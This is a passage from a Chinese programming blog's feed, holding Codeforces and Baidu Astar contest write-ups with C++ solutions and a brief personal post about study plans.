class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> a,b;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> t=b<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> r=t/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(a&gt;t)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;r&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ret=a-r;</span><br><span class="line"><span class="keyword">if</span>(b%<span class="number">2</span>==<span class="number">0</span>&amp;&amp;a&gt;=b/<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">ret--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(ret&gt;<span class="number">0</span>&amp;&amp;r&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;ret&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="number">0</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Bracket-Subsequence"><a href="#Bracket-Subsequence" class="headerlink" title="Bracket Subsequence"></a>Bracket Subsequence</h2><p>唯一一道没有fst的题目。。题意是给两个数$n$,$m$.然后给出$n$个’(‘或者’)’组成的合法括号序列，求删除里面某些括号得到一个含$m$个’(‘或者’)’的合法括号序列。这个很明显，直接读直接删。<br>考虑$sum_1$为构造的结果的单边括号数，$sum_2$为还剩余的没有打印的单边括号数。然后读入$n$个单边括号的序列，如果是’(‘就让$sum_1=sum_1+2$，然后$sum_2=sum_2+1$然后打印’(‘，如果是’)’就打印’)’然后$sum_2=sum_2-1$。最后当$sum_1=m$的时候终止，打印$sum_2$个’)’，仔细思考可以很清楚的发现，这个序列一定能通过原有序列进行删除某些括号得到，这是因为给出的序列一定是合法的，删除一定是一对’()’这样删除。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">2e5</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> nt[maxn];</span><br><span class="line"><span class="comment">//char p[maxn];</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;s;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> now=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">'('</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"("</span>);</span><br><span class="line">            count=count+<span class="number">2</span>;</span><br><span class="line">            now++;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            now--;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">")"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(count==m)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(now)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">")"</span>);</span><br><span class="line">        now--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Array-Restoration"><a href="#Array-Restoration" class="headerlink" title="Array Restoration"></a>Array Restoration</h2><p>题意比较难理解，我复述一下。首先给出两个数字$n$,$q$，然后你要考虑一个长度为$n$的数组，这个数组里面没有任何值，现在进行$q$次询问，第$i$次询问让$(l,r)$位置的元素变为$i$，经过$q$次询问后你要保证数组的每一个元素都至少被你询问一次。这样你会得到一个长度为$n$的数组。你要考虑一种可能的$(l_i,r_i)$的值，使得最后的结果为接着读入的一个长度为$n$的数组。这个数组中为$0$的位置表示这个位置的值可以任意取到。注意，$q$次询问的顺序不能调换。<br>以两组样例进行举例，考虑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4 3</span><br><span class="line">1 0 2 3</span><br></pre></td></tr></table></figure><p>$n=4,q=3$ 那么如果第一次询问位置为(1,1)，第二次询问位置为(2,3)，第三次询问位置为(4,4)，就能得到数组1,2,2,3。这个数组和1,0,2,3 是匹配的，因为除了位置为0的元素其他的元素都相同。然后考虑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5 6</span><br><span class="line">6 5 6 2 2</span><br></pre></td></tr></table></figure><p>这是无法求出一种可能的序列的，因为考虑开头的三个元素6,5,6。也就是说第$6$次询问至少应该包含$(1,3)$这个子序列。那么第2个位置会变成6,而这里是5，这是不存在的。<br>具体怎么做，很难解释清楚，直接上代码吧。需要特别注意几个case，首先是目标串可能是全0，然后0的位置可能出现在第一个，也可能出现在最后一个。接着可能目标串中没有0但是最大元素又不等于$q$，这种情况无解。如果有0最大元素不等于$q$，要考虑某个$0$的位置为$q$，否则构造出来的结果不满足题意，因为$q$次询问都至少要询问一个位置，也就是说最少有一个位置的元素为$q$。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">2e5</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> p[maxn];</span><br><span class="line"><span class="keyword">int</span> pr[maxn];</span><br><span class="line"><span class="keyword">int</span> mp1[maxn];</span><br><span class="line"><span class="keyword">int</span> mp2[maxn];</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> l;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(<span class="keyword">const</span> node&amp; ths)<span class="keyword">const</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>-&gt;l&lt;ths.l;</span><br><span class="line">&#125;</span><br><span class="line">&#125;node;</span><br><span class="line">node mp3[maxn];</span><br><span class="line"><span class="built_in">set</span>&lt;node&gt;st;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,q;</span><br><span class="line">    <span class="keyword">int</span> maxs=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> isZero=<span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;q);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;p[i]);</span><br><span class="line">        <span class="keyword">if</span>(p[i]!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">isZero=<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(mp2[p[i]]!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">node temp;</span><br><span class="line">temp.l=mp1[p[i]];</span><br><span class="line">temp.r=mp2[p[i]];</span><br><span class="line">temp.i=p[i];</span><br><span class="line">mp1[p[i]]=mp2[p[i]];</span><br><span class="line">mp2[p[i]]=i;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(mp1[p[i]]==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            mp1[p[i]]=i;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        mp2[p[i]]=i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(p[i]&gt;maxs)</span><br><span class="line">        maxs=p[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> r=<span class="number">1</span>;r&lt;=q;++r)</span><br><span class="line">    &#123;</span><br><span class="line">    node temp;</span><br><span class="line">    temp.l=mp1[r];</span><br><span class="line">    temp.r=mp2[r];</span><br><span class="line">    temp.i=r;</span><br><span class="line">    st.insert(temp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">set</span>&lt;node&gt;::iterator iter;</span><br><span class="line"><span class="built_in">set</span>&lt;node&gt;::iterator next;</span><br><span class="line">next=st.begin();</span><br><span class="line">iter=next;</span><br><span class="line">next++;</span><br><span class="line"><span class="keyword">for</span>(;next!=st.end();++iter,++next)</span><br><span class="line">&#123;</span><br><span class="line">node ts=*iter;</span><br><span class="line">node ths=*next;</span><br><span class="line"><span class="keyword">if</span>(ts.i&gt;ths.i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(ts.r&gt;ths.l)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"NO\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isZero)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"YES\n"</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>,q);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> value=<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;=<span class="number">1</span>;--i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(p[i]!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">value=p[i];</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(maxs&lt;q)</span><br><span class="line">&#123;</span><br><span class="line">maxs=q;</span><br><span class="line">p[i]=maxs;</span><br><span class="line">value=maxs;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">p[i]=value;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(p[i]!=<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">value=p[i];</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">p[i]=value;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(p[i]==<span class="number">0</span>||p[i]==<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"error\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(maxs&lt;q)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"NO\n"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"YES\n"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,p[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Codeforces-Round-504&quot;&gt;&lt;a href=&quot;#Codeforces-Round-504&quot; class=&quot;headerlink&quot; title=&quot;Codeforces Round #504&quot;&gt;&lt;/a&gt;Codeforces Round #504&lt;/h1
      
    
    </summary>
    
      <category term="Codeforces" scheme="lengyu.me/categories/Codeforces/"/>
    
    
      <category term="算法" scheme="lengyu.me/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="Codeforces" scheme="lengyu.me/tags/Codeforces/"/>
    
  </entry>
  
  <entry>
    <title>近期的一些规划</title>
    <link href="lengyu.me/2018/08/13/%E8%BF%91%E6%9C%9F%E7%9A%84%E4%B8%80%E4%BA%9B%E8%A7%84%E5%88%92/"/>
    <id>lengyu.me/2018/08/13/近期的一些规划/</id>
    <published>2018-08-13T10:24:51.000Z</published>
    <updated>2019-07-28T15:41:39.016Z</updated>
    
    <content type="html"><![CDATA[<h1 id="近期的一些规划"><a href="#近期的一些规划" class="headerlink" title="近期的一些规划"></a>近期的一些规划</h1><p>回顾已经过去的一个月假期，感觉自己还是太咸鱼了，啥也没做。连续十多天没有学习了，在接下来的时间，首先<del>去剪个头</del>会调整状态，然后csapp系列会继续开坑。间歇性加强英语学习，然后算法方面….随缘吧，大概就跟着cf走吧，感觉这条路太迷茫了，看不到走下去的希望。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;近期的一些规划&quot;&gt;&lt;a href=&quot;#近期的一些规划&quot; class=&quot;headerlink&quot; title=&quot;近期的一些规划&quot;&gt;&lt;/a&gt;近期的一些规划&lt;/h1&gt;&lt;p&gt;回顾已经过去的一个月假期，感觉自己还是太咸鱼了，啥也没做。连续十多天没有学习了，在接下来的时间，首先
      
    
    </summary>
    
    
      <category term="闲谈" scheme="lengyu.me/tags/%E9%97%B2%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>百度之星-初赛(B)</title>
    <link href="lengyu.me/2018/08/12/%E7%99%BE%E5%BA%A6%E4%B9%8B%E6%98%9F-%E5%88%9D%E8%B5%9B-B/"/>
    <id>lengyu.me/2018/08/12/百度之星-初赛-B/</id>
    <published>2018-08-12T05:34:21.000Z</published>
    <updated>2019-07-28T15:41:39.016Z</updated>
    
    <content type="html"><![CDATA[<h1 id="百度之星-初赛-B"><a href="#百度之星-初赛-B" class="headerlink" title="百度之星-初赛(B)"></a>百度之星-初赛(B)</h1><p>啊又一次暴露了自己是个鶸的事实，百毒的题目太毒瘤了，难度梯度贼jr大。。顺便吐槽一下MathJax的数学公式解析，解析出来有时候和本机渲染出来不一致，在我的blog上表现为不能渲染类似a_{ij}这样下标括号的东西，有概率出错。</p><h2 id="Degree"><a href="#Degree" class="headerlink" title="Degree"></a>Degree</h2><p>赛中xjr写过，直接暴力查degree最大的点，暴力删不含此点的边，暴力判断合并，并查集优化。此题存在正解，如果考虑森林数为$C$,点数为$V$，边数为$E$，最大degree为$M$，此点称为最大点。</p><h3 id="当k-0的时候"><a href="#当k-0的时候" class="headerlink" title="当k=0的时候"></a>当k=0的时候</h3><p>如果考虑每个树连一条边到最大点上，此时不可能继续加边了，因为继续加肯定重复或者成环，所以结果为$C+M-1$</p><h3 id="当-k-geq-0-的时候"><a href="#当-k-geq-0-的时候" class="headerlink" title="当$k\geq 0$的时候"></a>当$k\geq 0$的时候</h3><p>还是考虑在$C+M-1$上进行删边，因为先删后删显然是一样的，那么如果对于一条边$(u,v)$，这里肯定不是我们之前添加的边，因为这样搞没意义，那么如果删掉这条边，就出现了一个不与最大点连通的连通分支，那么肯定可以继续加一条边，于是删一条边就能加一条边，结果就是$C+M-1+K$但是考虑最多只能有$V-1$条边，取一个$min$就行了</p><h3 id="考虑C怎么求"><a href="#考虑C怎么求" class="headerlink" title="考虑C怎么求"></a>考虑C怎么求</h3><p>可以直接并查集，复杂度$O(m)$，也可以考虑数学做法，因为有$V-E+F=C-1$，其中$F$为面数等于1，所以$C=V-E$,也可以这样得到，考虑每棵树都只有这颗数的点数-1条边，于是也能得到这个结果。</p><h2 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h2><p>啊这个题是真的不应该，明显的打牌题，考虑$dp[i][j][k]$为$(i,j)$位置大小为$k$的图形的颜色数就行了。。。不过作者给了一种比较巧妙的方法得到颜色数，考虑一个64位数，其中第$i$为为1表示有第$i$种颜色，于是就可以用位运算进行交并补啦！啊，我可真是个鶸</p><h2 id="p1m2"><a href="#p1m2" class="headerlink" title="p1m2"></a>p1m2</h2><p>一道手速晋级题，卡了一个case直接wa了3发，罚时爆炸差200分晋级，gg。最大最小问题或者最小最大问题用二分应该是很显然的事情了，考虑$mid$的时候为最小值，判断$mid$为最小值的情况是否成立即可，当$mid$为最小值的时候只能出现$mid$或者$mid+1$。考虑$sum_i,sum_m,sum_j$分别为让元素进行加1操作的最大次数，最小次数，进行减2操作的次数，于是只要$sum_m \leq sum_j \leq sum_i$就表示$mid$能够成立，而这三个值直接这样考虑，对于数组中小于$mid-1$的元素$a_i$，对$sun_i$,$sum_m$的贡献分别为$mid+1-a_i$,$mid-a_i$，对于大于$mid-1$的元素，对$sum_j$的贡献为$(a_i-mid)/2$这个地方是int除法，这样可以减到$mid$或者$mid+1$，好了最关键的一个$case$到了，如果减2减到了$mid$，他还能对$sum_i$贡献1，没想到吧！我tmd在这里贡献了三发wa。。我们一起学算法，一起wawawawawa。</p><h2 id="rect"><a href="#rect" class="headerlink" title="rect"></a>rect</h2><p>贪心，题目给出各个点$x$,$y$都不相同，而考虑肯定只能是垂线或者水平线才能最短，这样就避免了重复，直接取最短的一边连上去就行了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;百度之星-初赛-B&quot;&gt;&lt;a href=&quot;#百度之星-初赛-B&quot; class=&quot;headerlink&quot; title=&quot;百度之星-初赛(B)&quot;&gt;&lt;/a&gt;百度之星-初赛(B)&lt;/h1&gt;&lt;p&gt;啊又一次暴露了自己是个鶸的事实，百毒的题目太毒瘤了，难度梯度贼jr大。。顺便吐槽
      
    
    </summary>
    
    
      <category term="算法" scheme="lengyu.me/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Codeforces Round #502 </title>
    <link href="lengyu.me/2018/08/11/Codeforces-Round-502/"/>
    <id>lengyu.me/2018/08/11/Codeforces-Round-502/</id>
    <published>2018-08-11T08:28:34.000Z</published>
    <updated>2019-07-28T15:41:39.012Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Codeforces-Round-502"><a href="#Codeforces-Round-502" class="headerlink" title="Codeforces Round #502"></a>Codeforces Round #502</h1><p>啊，博客挂掉重建之后的第一篇blog，因为这几天都在折腾换vps以及将主环境从windows迁移到ubuntu的事情，现在才补这一场的题。这一场题质量很高，被吊起来打，充分暴露了自己智商不够，码力不足的现状。<br><a href="https://codeforces.com/contest/1017/my" target="_blank" rel="noopener">Codeforces Round #502</a> </p><h2 id="The-Rank"><a href="#The-Rank" class="headerlink" title="The Rank"></a>The Rank</h2><p>签到题，排序，代码都懒得贴了。</p><h2 id="The-Bits"><a href="#The-Bits" class="headerlink" title="The Bits"></a>The Bits</h2><p>简单题，题意是说给两个串，判断有多少种方式改变第一个串中$(i,j)$的位置,使得两个01串的XOR值改变(又是XOR,前面那个矩阵也是XOR)，我们显然明白这样一个事实，$a^b=c$则如果以二进制串来看,$c$为1的位置当且仅当在当前位置$a$,$b$的值不相同。那么很显然，我们用$sum_1$,$sum_2$,$sum_3$,$sum_4$来记录这样四种结果，分别是$a$,$b$串中均为1，$a$为1$b$为0,$a$为0$b$为1,$ab$都为0四种情况的位置数量。显然处于相同情况的位置不能交换，然后其中又有几种情况的组合之间交换也会使得结果不会改变，然后根据简单的排列组合知识，求出结果.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">1e5</span>+<span class="number">3</span>;</span><br><span class="line"><span class="keyword">bool</span> a[maxn],b[maxn],c[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">string</span> ax;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;ax;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span>(ax[i<span class="number">-1</span>]==<span class="string">'0'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    a[i]=<span class="literal">false</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">a[i]=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;ax;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ax[i<span class="number">-1</span>]==<span class="string">'0'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        b[i]=<span class="literal">false</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">b[i]=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> sum1,sum2,sum3,sum4;</span><br><span class="line">    sum1=sum2=sum3=sum4=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]==<span class="literal">true</span>&amp;&amp;b[i]==<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum1++;<span class="comment">//都是1</span></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a[i]==<span class="literal">true</span>&amp;&amp;b[i]==<span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum2++;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a[i]==<span class="literal">false</span>&amp;&amp;b[i]==<span class="literal">true</span>)</span><br><span 